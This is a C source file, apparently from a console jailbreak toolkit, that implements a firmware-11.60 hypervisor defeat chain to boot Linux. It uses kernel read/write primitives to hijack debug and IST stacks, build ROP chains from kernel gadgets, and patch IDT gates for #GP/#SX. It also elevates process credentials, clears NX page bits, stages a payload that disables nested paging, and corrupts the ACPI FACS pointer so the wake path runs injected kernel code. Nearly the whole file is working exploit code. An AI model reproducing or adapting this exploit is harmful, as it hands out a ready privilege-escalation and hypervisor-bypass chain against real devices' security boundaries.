#include "hv_defeat_1160.h"
#include "../shellcode_break_hv/break_hv.h"
#include "../shellcode_break_hv/break_hv_params.h"
#include "config.h"
#include "hv_defeat_13xx.h"
#include "loader_staging_1160.h"
#include "utils.h"
#include <machine/segments.h>
#include <machine/tss.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/cpuset.h>
#include <unistd.h>

/*
 * 11.60 resume chain:
 *
 *   startup_mp DR0 hook -> AP payload at PA 0x3ffff000 -> disable NPT on all
 *   16 GameOS VMCBs -> stock wake path -> #GP/#SX ROP -> kernel wake blob.
 *
 * The DR0 carrier and the AP payload (shellcode_break_hv) are based on
 * Byepervisor. The #GP/#SX transfer is the same shape as 13.60: it copies the
 * wake blob from its prepare_resume() alias into the kernel code cave.
 */

#define FW_1100_RAW 0x11000043U
#define FW_1120_RAW 0x11200005U
#define FW_1140_RAW 0x11400005U
#define FW_1000_RAW 0x10000046U
#define FW_1001_RAW 0x10010000U
#define FW_1020_RAW 0x10200006U
#define FW_1040_RAW 0x10400007U
#define FW_1060_RAW 0x10600006U
#define FW_1160_RAW 0x11600005U
#define NCPU 16
#define TSS_STRIDE 0x68ULL
#define TSS_IST(ist) (0x24ULL + ((uint64_t)((ist) - 1) * 8ULL))

#define KH_USER_CS 0x43ULL
#define KH_USER_SS 0x3bULL
#define KH_RFLAGS_USER 0x202ULL
#define KH_DR7_BP0_EXEC 0x403ULL
#define KH_GATE_INTERRUPT 0xeULL

#define RC_RBP 0x20ULL
#define RC_RSP 0x28ULL
#define RC_RIP 0x38ULL
#define RC_DR7 0xa0ULL

#define AP_PAYLOAD_PAGE 0x3ffff000ULL
#define AP_COPY_SIZE 0x800ULL

#define CAVE_ORACLE_OFF 0x440ULL
#define CAVE_ARM_OFF 0x1000ULL
#define CAVE_ARM_CTX_OFF 0x100ULL
#define CAVE_ARM_CONT_OFF 0x200ULL
#define CAVE_FALLBACKS_OFF 0x1400ULL
#define CAVE_HANDLER_OFF 0x2400ULL
#define CAVE_AP_SOURCE_OFF 0x2800ULL
#define CAVE_SAVE_OFF 0x3000ULL
#define CAVE_STASH_OFF 0x3400ULL

#define IRET_OFF 0x20ULL
#define FRAME_OFF 0x28ULL
#define STACK_TOP_OFF 0x50ULL
#define FALLBACK_SIZE 0x100ULL

#define SAVE_STATE 0x00ULL
#define SAVE_GATE_LO 0x08ULL
#define SAVE_GATE_HI 0x10ULL
#define SAVE_ISTS 0x18ULL

#define STATE_ARMED 0x493950524F444152ULL /* "I9PRODAR" */
#define CHAIN_MARK 0x434841494E2D3031ULL  /* "CHAIN-01" */

#define KTEXT_1160_END 0xD30000ULL
#define CODE_CAVE_CAPACITY (KTEXT_1160_END - 0xD2B000ULL)

_Static_assert(CAVE_ARM_OFF + 0x400 <= CAVE_FALLBACKS_OFF,
               "DR0 arm overlaps fallbacks");
_Static_assert(CAVE_FALLBACKS_OFF + 15 * FALLBACK_SIZE <= CAVE_HANDLER_OFF,
               "fallbacks overlap handler");
_Static_assert(CAVE_HANDLER_OFF + 0x400 <= CAVE_AP_SOURCE_OFF,
               "handler overlaps AP source");
_Static_assert(CAVE_AP_SOURCE_OFF + AP_COPY_SIZE <= CAVE_SAVE_OFF,
               "AP source overlaps recovery state");
_Static_assert(CAVE_STASH_OFF + 0x100 <= 0x4000,
               "result stash exceeds resume cave");
_Static_assert(sizeof(break_hv_bin) <= AP_COPY_SIZE,
               "AP payload exceeds AP_COPY_SIZE");

static uint64_t kg(uint64_t offset) { return ktext + offset; }

static int offsets_present(void) {
  const uint64_t required[] = {
      env_offset.ACPIGBL_FACS,
      env_offset.IDT,
      env_offset.COMMON_TSS,
      env_offset.KERNEL_CODE_CAVE,
      env_offset.FUN_MEMCPY,
      env_offset.HV_MP_STARTUP_CALL,
      env_offset.MP_STARTUP_INIT_VECTOR,
      env_offset.DATA_CAVE,
      env_offset.GAD_ADD_RSP_28_POP_RBP_RET,
      env_offset.GAD_PIVOT_ADD_RSP28_RET,
      env_offset.GAD_IRETQ,
      env_offset.GAD_POP_RAX_RET,
      env_offset.GAD_POP_RCX_RET,
      env_offset.GAD_POP_RDI_RET,
      env_offset.GAD_POP_RSI_RET,
      env_offset.GAD_POP_RDX_RET,
      env_offset.GAD_POP_RSP_RET,
      env_offset.GAD_STORE_RDI8_RCX_RET,
      env_offset.GAD_SET_DR7_RET,
      env_offset.GAD_STORE_RCX_RAX_RET,
      env_offset.GAD_MOV_RAX_RDI_RET,
      env_offset.GAD_REP_MOVSB_RET,
      env_offset.GAD_CLD_RET,
      env_offset.GAD_RET_TRAMP,
      env_offset.GAD_DBREG_RESUME,
      env_offset.G_VBIOS,
      env_offset.FUN_TRANSMITTER_CONTROL,
      env_offset.FUN_MP3_INITIALIZE,
      env_offset.FUN_MP3_INVOKE,
  };

  uint32_t expected_raw = 0;

  switch (fw) {
  case 0x1100: expected_raw = FW_1100_RAW; break;
  case 0x1120: expected_raw = FW_1120_RAW; break;
  case 0x1140: expected_raw = FW_1140_RAW; break;
  case 0x1000: expected_raw = FW_1000_RAW; break;
  case 0x1001: expected_raw = FW_1001_RAW; break;
  case 0x1020: expected_raw = FW_1020_RAW; break;
  case 0x1040: expected_raw = FW_1040_RAW; break;
  case 0x1060: expected_raw = FW_1060_RAW; break;
  case 0x1160: expected_raw = FW_1160_RAW; break;
  default: return 0;
  }
  if (kernel_get_fw_version() != expected_raw)
    return 0;
  /* Every 10.x/11.x build shares the same hypervisor image and CC cave. */
  if (env_offset.HV_CODE_CAVE_PA != 0x62806F00ULL)
    return 0;
  if (fw >= 0x1000 && fw < 0x1050) {
    if (env_offset.HV_HANDLE_VMEXIT_PA != 0x62847488ULL)
      return 0;
  } else if (fw == 0x1060) {
    if (env_offset.HV_HANDLE_VMEXIT_PA != 0x628474A8ULL)
      return 0;
  } else if (env_offset.HV_HANDLE_VMEXIT_PA != 0x62847551ULL) {
    return 0;
  }
  if (fw >= 0x1100 &&
      (env_offset.KERNEL_CODE_CAVE != 0xD2B000ULL ||
       env_offset.DATA_CAVE != 0x2D02000ULL))
    return 0;
  for (size_t i = 0; i < sizeof(required) / sizeof(required[0]); i++)
    if (required[i] == 0)
      return 0;
  return 1;
}

static int pin_to_tss0(void) {
  uint64_t mask[2] = {0, 0};
  cpusetid_t set_id;

  if (cpuset(&set_id))
    return -1;
  mask[0] = 0xffff;
  if (cpuset_setaffinity(3, 3, set_id, 8, (const cpuset_t *)mask))
    return -1;

  /* On 11.60, scheduler CPU 15 uses COMMON_TSS slot zero. */
  mask[0] = 1ULL << 15;
  return cpuset_setaffinity(3, 1, -1, 0x10, (const cpuset_t *)mask);
}

static int walk_page(uint64_t va, int clear_nx) {
  uint64_t table = cr3;

  for (int level = 0; level < 4; level++) {
    int shift = 39 - level * 9;
    uint64_t index = (va >> shift) & 0x1ff;
    uint64_t entry_addr = dmap + PAGE_PA(table) + index * 8;
    uint64_t entry = kread64(entry_addr);

    if (!PAGE_P(entry))
      return -1;
    if (clear_nx && (entry & (1ULL << NX))) {
      entry &= ~(1ULL << NX);
      kwrite64(entry_addr, entry);
      if (kread64(entry_addr) != entry)
        return -1;
    }
    if (entry & (1ULL << NX))
      return -1;
    if (((level == 1 || level == 2) && PAGE_PS(entry)) || level == 3)
      return 0;
    table = PAGE_PA(entry);
  }
  return -1;
}

static int validate_wake_cave(size_t shellcode_len) {
  if (shellcode_len == 0 || shellcode_len > CODE_CAVE_CAPACITY)
    return -1;

  /*
   * Do not read 11.60 kernel text while NPT is still on: NPT enforces its
   * execute-only mapping, so clearing the guest XO bit does not make it
   * readable. [0xD2B000, 0xD30000) is NOP padding in the 11.60 kernel, so
   * only check that every page of the cave is present and executable.
   */
  for (size_t off = 0; off < shellcode_len; off += 0x1000)
    if (walk_page(kg(env_offset.KERNEL_CODE_CAVE) + off, 0))
      return -1;
  return 0;
}

static uint64_t tss_ist_slot(uint64_t tss_base, int cpu, int ist) {
  return tss_base + (uint64_t)cpu * TSS_STRIDE + TSS_IST(ist);
}

static void gate_encode(uint64_t target, uint16_t selector, uint8_t ist,
                        uint64_t *lo, uint64_t *hi) {
  *lo = (target & 0xffffULL) | ((uint64_t)selector << 16) |
        ((uint64_t)(ist & 7) << 32) | (KH_GATE_INTERRUPT << 40) | (1ULL << 47) |
        (((target >> 16) & 0xffffULL) << 48);
  *hi = (target >> 32) & 0xffffffffULL;
}

static int verify_tss_layout(uint64_t tss_base, uint64_t saved[NCPU],
                             int db_ist) {
  uint64_t rsp0[NCPU];
  uint64_t ist4[NCPU];

  for (int cpu = 0; cpu < NCPU; cpu++) {
    uint64_t base = tss_base + (uint64_t)cpu * TSS_STRIDE;
    rsp0[cpu] = kread64(base + 0x04);
    ist4[cpu] = kread64(base + TSS_IST(db_ist));
    saved[cpu] = kread64(tss_ist_slot(tss_base, cpu, 6));
    if ((rsp0[cpu] >> 47) != 0x1ffffULL || ist4[cpu] == 0 || saved[cpu] != 0)
      return -1;
    for (int prior = 0; prior < cpu; prior++)
      if (rsp0[cpu] == rsp0[prior] || ist4[cpu] == ist4[prior])
        return -1;
  }
  return 0;
}

static int restore_ists(uint64_t tss_base, const uint64_t saved[NCPU]) {
  for (int cpu = 0; cpu < NCPU; cpu++)
    kwrite64(tss_ist_slot(tss_base, cpu, 6), saved[cpu]);
  for (int cpu = 0; cpu < NCPU; cpu++)
    if (kread64(tss_ist_slot(tss_base, cpu, 6)) != saved[cpu])
      return -1;
  return 0;
}

static int chain_q(uint8_t *buf, size_t *off, size_t cap, uint64_t value) {
  if (*off + sizeof(value) > cap)
    return -1;
  memcpy(buf + *off, &value, sizeof(value));
  *off += sizeof(value);
  return 0;
}

static int chain_store(uint8_t *buf, size_t *off, size_t cap, uint64_t target,
                       uint64_t value) {
  return chain_q(buf, off, cap, kg(env_offset.GAD_POP_RDI_RET)) ||
         chain_q(buf, off, cap, target - 8) ||
         chain_q(buf, off, cap, kg(env_offset.GAD_POP_RCX_RET)) ||
         chain_q(buf, off, cap, value) ||
         chain_q(buf, off, cap, kg(env_offset.GAD_STORE_RDI8_RCX_RET));
}

static int build_passthrough(uint8_t *stack, uint64_t stack_va) {
  uint64_t trampoline = stack_va + IRET_OFF;
  size_t off = STACK_TOP_OFF;

  memset(stack, 0, FALLBACK_SIZE);
  memcpy(stack + IRET_OFF, &(uint64_t){kg(env_offset.GAD_IRETQ)}, 8);
  return chain_q(stack, &off, FALLBACK_SIZE, kg(env_offset.GAD_POP_RSP_RET)) ||
         chain_q(stack, &off, FALLBACK_SIZE, trampoline);
}

static int build_arm(uint8_t *arm, uint64_t arm_va, uint64_t hook_target,
                     uint64_t selected_ist, uint64_t handler_top) {
  uint64_t ctx = arm_va + CAVE_ARM_CTX_OFF;
  uint64_t cont = arm_va + CAVE_ARM_CONT_OFF;
  size_t off = STACK_TOP_OFF;

  memset(arm, 0, 0x400);
  if (chain_q(arm, &off, 0x400, kg(env_offset.GAD_POP_RAX_RET)) ||
      chain_q(arm, &off, 0x400, hook_target) ||
      chain_q(arm, &off, 0x400, kg(env_offset.GAD_POP_RDI_RET)) ||
      chain_q(arm, &off, 0x400, ctx) ||
      chain_q(arm, &off, 0x400, kg(env_offset.GAD_DBREG_RESUME)) ||
      off > CAVE_ARM_CTX_OFF)
    return -1;

  memcpy(arm + CAVE_ARM_CTX_OFF + RC_RSP, &(uint64_t){cont - 8}, 8);
  memcpy(arm + CAVE_ARM_CTX_OFF + RC_RIP,
         &(uint64_t){kg(env_offset.GAD_RET_TRAMP)}, 8);
  memcpy(arm + CAVE_ARM_CTX_OFF + RC_DR7, &(uint64_t){KH_DR7_BP0_EXEC}, 8);

  off = CAVE_ARM_CONT_OFF;
  if (chain_q(arm, &off, 0x400, kg(env_offset.GAD_POP_RDI_RET)) ||
      chain_q(arm, &off, 0x400, selected_ist - 8) ||
      chain_q(arm, &off, 0x400, kg(env_offset.GAD_POP_RCX_RET)) ||
      chain_q(arm, &off, 0x400, handler_top) ||
      chain_q(arm, &off, 0x400, kg(env_offset.GAD_STORE_RDI8_RCX_RET)) ||
      chain_q(arm, &off, 0x400, kg(env_offset.GAD_IRETQ)))
    return -1;
  off += 5 * sizeof(uint64_t);
  return off <= 0x400 ? 0 : -1;
}

static int build_handler(uint8_t *handler, uint64_t handler_va,
                         uint64_t resume_cave, uint64_t db_gate,
                         uint64_t saved_gate_lo, uint64_t kernel_cr3) {
  uint64_t trampoline = handler_va + IRET_OFF;
  uint64_t payload_va = dmap + AP_PAYLOAD_PAGE;
  uint64_t oracle = resume_cave + CAVE_ORACLE_OFF;
  size_t save_addr_off, restore_rdi_off;
  size_t off = STACK_TOP_OFF;
  uint64_t hv_offset = 0;

  if (linux_i.kit_type == KIT_RETAIL_PRO) {
    uint64_t hv_region = derive_h();
    if (!hv_region)
      return -1;
    hv_offset = hv_region + HV_CODE_OFFSET_PRO - HV_BASE_REGULAR;
  }

  memset(handler, 0, 0x400);
  memcpy(handler + IRET_OFF, &(uint64_t){kg(env_offset.GAD_IRETQ)}, 8);

  if (chain_q(handler, &off, 0x400, kg(env_offset.GAD_MOV_RAX_RDI_RET)) ||
      chain_q(handler, &off, 0x400, kg(env_offset.GAD_POP_RCX_RET)))
    return -1;
  save_addr_off = off;
  if (chain_q(handler, &off, 0x400, 0) ||
      chain_q(handler, &off, 0x400, kg(env_offset.GAD_STORE_RCX_RAX_RET)) ||
      chain_store(handler, &off, 0x400, db_gate, saved_gate_lo) ||
      chain_q(handler, &off, 0x400, kg(env_offset.GAD_POP_RAX_RET)) ||
      chain_q(handler, &off, 0x400, 0) ||
      chain_q(handler, &off, 0x400, kg(env_offset.GAD_SET_DR7_RET)) ||
      chain_store(handler, &off, 0x400, oracle + 0x20, CHAIN_MARK))
    return -1;

  if (chain_q(handler, &off, 0x400, kg(env_offset.GAD_CLD_RET)) ||
      chain_q(handler, &off, 0x400, kg(env_offset.GAD_POP_RDI_RET)) ||
      chain_q(handler, &off, 0x400, payload_va) ||
      chain_q(handler, &off, 0x400, kg(env_offset.GAD_POP_RSI_RET)) ||
      chain_q(handler, &off, 0x400, resume_cave + CAVE_AP_SOURCE_OFF) ||
      chain_q(handler, &off, 0x400, kg(env_offset.GAD_POP_RCX_RET)) ||
      chain_q(handler, &off, 0x400, AP_COPY_SIZE) ||
      chain_q(handler, &off, 0x400, kg(env_offset.GAD_REP_MOVSB_RET)))
    return -1;

#define STORE_PARAM(offset, value)                                             \
  do {                                                                         \
    if (chain_store(handler, &off, 0x400, dmap + AP_PAYLOAD_PAGE + (offset),   \
                    (value)))                                                  \
      return -1;                                                               \
  } while (0)
  STORE_PARAM(0xf00, kg(env_offset.MP_STARTUP_INIT_VECTOR));
  STORE_PARAM(0xf08, dmap);
  STORE_PARAM(0xf10, oracle);
  STORE_PARAM(0xf18, hv_offset);
  STORE_PARAM(0xf20, resume_cave + CAVE_STASH_OFF);
  STORE_PARAM(0xf28, payload_va);
  STORE_PARAM(0xf30, kernel_cr3);
  STORE_PARAM(0xf38, AP_MODE_1160);
#undef STORE_PARAM

  if (chain_q(handler, &off, 0x400, kg(env_offset.GAD_POP_RDI_RET)))
    return -1;
  restore_rdi_off = off;
  if (chain_q(handler, &off, 0x400, 0) ||
      chain_q(handler, &off, 0x400, kg(env_offset.GAD_POP_RSI_RET)) ||
      chain_q(handler, &off, 0x400, payload_va) ||
      chain_q(handler, &off, 0x400, kg(env_offset.GAD_POP_RDX_RET)) ||
      chain_q(handler, &off, 0x400, kernel_cr3) ||
      chain_q(handler, &off, 0x400, kg(env_offset.GAD_POP_RSP_RET)) ||
      chain_q(handler, &off, 0x400, trampoline))
    return -1;

  memcpy(handler + save_addr_off, &(uint64_t){handler_va + restore_rdi_off}, 8);
  return 0;
}

__attribute__((noinline)) static void
arm_dr0_and_return(uint64_t db_gate, uint64_t gate_lo, uint64_t arm_ctx,
                   uint64_t return_frame) {
  uint64_t rsp, rbx, rbp, r12, r13, r14, r15;
  void *resume_label = &&resumed;

  __asm__ volatile("mov %%rsp,%0" : "=r"(rsp));
  __asm__ volatile("mov %%rbx,%0" : "=r"(rbx));
  __asm__ volatile("mov %%rbp,%0" : "=r"(rbp));
  __asm__ volatile("mov %%r12,%0" : "=r"(r12));
  __asm__ volatile("mov %%r13,%0" : "=r"(r13));
  __asm__ volatile("mov %%r14,%0" : "=r"(r14));
  __asm__ volatile("mov %%r15,%0" : "=r"(r15));

  kwrite64(arm_ctx + 0x00, r15);
  kwrite64(arm_ctx + 0x08, r14);
  kwrite64(arm_ctx + 0x10, r13);
  kwrite64(arm_ctx + 0x18, r12);
  kwrite64(arm_ctx + RC_RBP, rbp);
  kwrite64(arm_ctx + RC_RSP, return_frame - 7 * sizeof(uint64_t));
  kwrite64(arm_ctx + 0x30, rbx);
  kwrite64(arm_ctx + RC_RIP, kg(env_offset.GAD_RET_TRAMP));

  kwrite64(return_frame + 0x00, (uint64_t)resume_label);
  kwrite64(return_frame + 0x08, KH_USER_CS);
  kwrite64(return_frame + 0x10, KH_RFLAGS_USER);
  kwrite64(return_frame + 0x18, rsp);
  kwrite64(return_frame + 0x20, KH_USER_SS);

  kwrite64(db_gate, gate_lo);
  __asm__ volatile("pushfq\n\t"
                   "orq $0x100, (%%rsp)\n\t"
                   "popfq\n\t"
                   "nop\n\t"
                   :
                   :
                   : "memory", "cc");
resumed:
  return;
}

static int arm_startup_carrier(uint64_t resume_cave) {
  uint64_t tss_base = kg(env_offset.COMMON_TSS);
  uint64_t db_gate = kg(env_offset.IDT) + 16;
  uint64_t arm_va = resume_cave + CAVE_ARM_OFF;
  uint64_t handler_va = resume_cave + CAVE_HANDLER_OFF;
  uint64_t hook_target = kg(env_offset.HV_MP_STARTUP_CALL);
  uint64_t saved_gate_lo = kread64(db_gate);
  uint64_t saved_gate_hi = kread64(db_gate + 8);
  uint64_t gate_lo, gate_hi;
  uint64_t saved_ist[NCPU];
  uint8_t arm[0x400], handler[0x400], fallback[FALLBACK_SIZE];
  uint8_t staged[AP_COPY_SIZE], verify[0x400];

  if (break_hv_bin_len == 0 || break_hv_bin_len > sizeof(staged) ||
      kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != 0)
    return -1;
  {
    int gate_p = (int)((saved_gate_lo >> 47) & 1);
    int gate_ist = (int)((saved_gate_lo >> 32) & 7);
    int tss_rc = (gate_p && gate_ist >= 1 && gate_ist <= 7)
                     ? verify_tss_layout(tss_base, saved_ist, gate_ist)
                     : -1;
    if (!gate_p || gate_ist < 1 || gate_ist > 7 || tss_rc) {
      notify("%04x arm gate: lo=0x%llx P=%d ist=%d tss=%d\n", fw,
             (unsigned long long)saved_gate_lo, gate_p, gate_ist, tss_rc);
      return -2;
    }
  }

  gate_encode(kg(env_offset.GAD_PIVOT_ADD_RSP28_RET),
              (uint16_t)(saved_gate_lo >> 16), 6, &gate_lo, &gate_hi);
  if (gate_hi != saved_gate_hi)
    return -3;

  memset(staged, 0, sizeof(staged));
  memcpy(staged, break_hv_bin, break_hv_bin_len);
  kwrite(resume_cave + CAVE_AP_SOURCE_OFF, staged, sizeof(staged));
  for (size_t checked = 0; checked < sizeof(staged);
       checked += sizeof(verify)) {
    kread(resume_cave + CAVE_AP_SOURCE_OFF + checked, verify, sizeof(verify));
    if (memcmp(verify, staged + checked, sizeof(verify)) != 0)
      return -4;
  }

  if (build_arm(arm, arm_va, hook_target, tss_ist_slot(tss_base, 0, 6),
                handler_va + STACK_TOP_OFF) ||
      build_handler(handler, handler_va, resume_cave, db_gate, saved_gate_lo,
                    cr3))
    return -5;

  kwrite(arm_va, arm, sizeof(arm));
  kwrite(handler_va, handler, sizeof(handler));
  kread(arm_va, verify, sizeof(verify));
  if (memcmp(verify, arm, sizeof(verify)) != 0)
    return -6;
  kread(handler_va, verify, sizeof(verify));
  if (memcmp(verify, handler, sizeof(verify)) != 0)
    return -6;

  for (int cpu = 1; cpu < NCPU; cpu++) {
    uint64_t va =
        resume_cave + CAVE_FALLBACKS_OFF + (uint64_t)(cpu - 1) * FALLBACK_SIZE;
    if (build_passthrough(fallback, va))
      return -7;
    kwrite(va, fallback, sizeof(fallback));
    kread(va, verify, sizeof(fallback));
    if (memcmp(verify, fallback, sizeof(fallback)) != 0)
      return -7;
  }

  kwrite64(resume_cave + CAVE_SAVE_OFF + SAVE_GATE_LO, saved_gate_lo);
  kwrite64(resume_cave + CAVE_SAVE_OFF + SAVE_GATE_HI, saved_gate_hi);
  for (int cpu = 0; cpu < NCPU; cpu++)
    kwrite64(resume_cave + CAVE_SAVE_OFF + SAVE_ISTS + (uint64_t)cpu * 8,
             saved_ist[cpu]);
  kwrite64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE, STATE_ARMED);
  if (kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != STATE_ARMED)
    return -8;

  kwrite64(tss_ist_slot(tss_base, 0, 6), arm_va + STACK_TOP_OFF);
  for (int cpu = 1; cpu < NCPU; cpu++) {
    uint64_t top = resume_cave + CAVE_FALLBACKS_OFF +
                   (uint64_t)(cpu - 1) * FALLBACK_SIZE + STACK_TOP_OFF;
    kwrite64(tss_ist_slot(tss_base, cpu, 6), top);
  }
  for (int cpu = 0; cpu < NCPU; cpu++) {
    uint64_t want = cpu == 0 ? arm_va + STACK_TOP_OFF
                             : resume_cave + CAVE_FALLBACKS_OFF +
                                   (uint64_t)(cpu - 1) * FALLBACK_SIZE +
                                   STACK_TOP_OFF;
    if (kread64(tss_ist_slot(tss_base, cpu, 6)) != want) {
      if (restore_ists(tss_base, saved_ist)) {
        notify("%04x IST6 rollback readback failed; cold reboot required\n", fw);
        return -10;
      }
      kwrite64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE, 0);
      if (kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != 0) {
        notify("%04x carrier-state rollback failed; cold reboot required\n", fw);
        return -10;
      }
      return -9;
    }
  }

  arm_dr0_and_return(db_gate, gate_lo, arm_va + CAVE_ARM_CTX_OFF,
                     arm_va + CAVE_ARM_CONT_OFF + 6 * sizeof(uint64_t));
  return 0;
}

static int build_sx_rop(uint64_t ist, size_t shellcode_len) {
  uint64_t rop[16] = {0};
  uint64_t *p = rop;

  /* The same transfer sequence as 13.xx. Its three UART debug writes use an
   * OR [rcx],eax gadget that the 11.60 kernel does not have, so they are left
   * out. */
  *p++ = kg(env_offset.GAD_POP_RDI_RET);
  *p++ = kg(env_offset.KERNEL_CODE_CAVE);
  *p++ = kg(env_offset.GAD_POP_RSI_RET);
  *p++ = kernel_cave_shellcode;
  *p++ = kg(env_offset.GAD_POP_RDX_RET);
  *p++ = shellcode_len;
  *p++ = kg(env_offset.FUN_MEMCPY);
  *p++ = kg(env_offset.KERNEL_CODE_CAVE);

  kwrite(ist + 0x1000, rop, (size_t)((uint8_t *)p - (uint8_t *)rop));
  return 0;
}

static void setidt(int vector, uint64_t handler, int ist) {
  struct gate_descriptor gate = {0};
  gate.gd_looffset = handler;
  gate.gd_selector = GSEL(GCODE_SEL, SEL_KPL);
  gate.gd_ist = ist;
  gate.gd_type = SDT_SYSIGT;
  gate.gd_dpl = SEL_KPL;
  gate.gd_p = 1;
  gate.gd_hioffset = handler >> 16;
  kwrite(kg(env_offset.IDT) + (uint64_t)vector * sizeof(struct gate_descriptor),
         &gate, sizeof(gate));
}

int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
  uint64_t resume_cave, sx_ist, facs;
  uint64_t zeroes[16] = {0};
  int rc;

  if (shellcode_kernel == NULL || !offsets_present()) {
    notify("%04x offsets/raw firmware gate failed; refusing to arm\n", fw);
    notify("gate diag: raw=0x%08x handler_pa=0x%llx cave_pa=0x%llx "
           "code_cave=0x%llx data_cave=0x%llx\n",
           (unsigned)kernel_get_fw_version(),
           (unsigned long long)env_offset.HV_HANDLE_VMEXIT_PA,
           (unsigned long long)env_offset.HV_CODE_CAVE_PA,
           (unsigned long long)env_offset.KERNEL_CODE_CAVE,
           (unsigned long long)env_offset.DATA_CAVE);
    return -1;
  }
  if (validate_wake_cave(shellcode_kernel_len)) {
    notify("%04x wake blob/cave mapping validation failed\n", fw);
    return -1;
  }

  facs = kread64(kg(env_offset.ACPIGBL_FACS));
  if ((facs >> 48) != 0xffffULL) {
    notify("%04x AcpiGbl_FACS validation failed; refusing to arm\n", fw);
    return -1;
  }

  kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL);
  if (pin_to_tss0() || sceKernelGetCurrentCpu() != 15) {
    notify("%04x could not pin scheduler CPU 15 / TSS slot zero\n", fw);
    return -1;
  }

  if (walk_page(dmap + AP_PAYLOAD_PAGE, 1)) {
    notify("%04x startup-AP carrier page is not executable\n", fw);
    return -1;
  }

  /* The wake blob runs on this page while it copies Linux into the cave, so
   * staging took it and checked it, and the page under it, before it wrote
   * anything.  See take_sx_stack_page_1160. */
  sx_ist = pa_to_dmap(sx_stack_page_1160());
  if (sx_ist == dmap || build_sx_rop(sx_ist, shellcode_kernel_len))
    return -1;

  resume_cave = kg(env_offset.DATA_CAVE);
  if (kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != 0) {
    notify("%04x resume carrier has stale state; cold reboot required\n", fw);
    return -1;
  }
  kwrite(resume_cave + CAVE_ORACLE_OFF, zeroes, sizeof(zeroes));
  kwrite(resume_cave + CAVE_STASH_OFF, zeroes, sizeof(zeroes));

  rc = arm_startup_carrier(resume_cave);
  if (rc) {
    notify("%04x startup-AP carrier refused to arm (%d)\n", fw, rc);
    return -1;
  }

  kwrite64(kg(env_offset.COMMON_TSS) + TSS_IST(7), sx_ist + 0x1000);
  /* #GP and #SX use a six-qword IST frame, so the final pivot
   * (add rsp,0x28; pop rbp; ret) advances all 0x30 bytes before entering the
   * ROP chain. The no-pop pivot above is only for the #DB startup carrier,
   * which has no error code. */
  setidt(13, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);
  setidt(30, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);

  /* As on 13.60, corrupt the FACS pointer so the stock wake path reaches
   * the #GP/#SX copy-and-transfer chain after NPT has been disabled. */
  kwrite64(kg(env_offset.ACPIGBL_FACS), kg(env_offset.ACPIGBL_FACS) - 8);

  notify("11.60 Linux wake chain armed\n");
  return 0;
}
